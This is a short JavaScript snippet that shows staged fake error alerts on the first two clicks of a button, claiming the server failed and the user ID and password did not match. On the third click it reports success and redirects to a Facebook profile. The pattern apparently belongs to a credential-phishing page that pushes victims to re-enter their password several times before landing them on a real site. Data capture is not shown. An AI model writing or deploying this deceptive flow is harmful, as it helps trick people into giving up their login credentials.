const myButton = document.getElementById('myButton');
let clickCount = 0;

myButton.addEventListener('click', function() {
  clickCount++;

  if (clickCount === 1) {
    setTimeout(function() {
      alert('Server didnot respond correctly, Please Try again');
    }, 1000); // Display the first message after 1 second
  } else if (clickCount === 2) {
    setTimeout(function() {
      alert('Make Sure User Id and Password Matched');
    }, 2000); // Display the second message after 2 seconds
  } else if (clickCount === 3) {
    setTimeout(function() {
      alert('Linked Successful');
      window.location.href = "http://facebook.com/profile.php?=73322363";
    }, 3000); // Display the third message after 3 seconds
  }
});
